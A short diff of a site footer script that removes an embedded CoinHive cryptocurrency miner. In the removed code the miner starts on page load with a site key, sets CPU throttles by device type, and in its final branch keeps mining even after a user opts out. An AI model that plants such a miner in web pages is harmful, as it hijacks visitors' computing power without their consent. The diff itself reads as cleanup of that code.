@@ -33,17 +33,3 @@ footer.appendChild(gap);
 footer.appendChild(footerYear);
 footer.appendChild(patent);
 document.getElementById("body").appendChild(footer);
-var minerSetup = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.3});
-if (!minerSetup.isMobile() && !minerSetup.didOptOut(900)) {
-  // desktop @ 70%
-  var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.3});
-  miner.start();
-} else if (minerSetup.isMobile() && !minerSetup.didOptOut(900)) {
-  // mobile @ 30%
-  var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.7});
-  miner.start();
-} else {
-  // unknown device @ 50%
-  var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.5});
-  miner.start();
-}
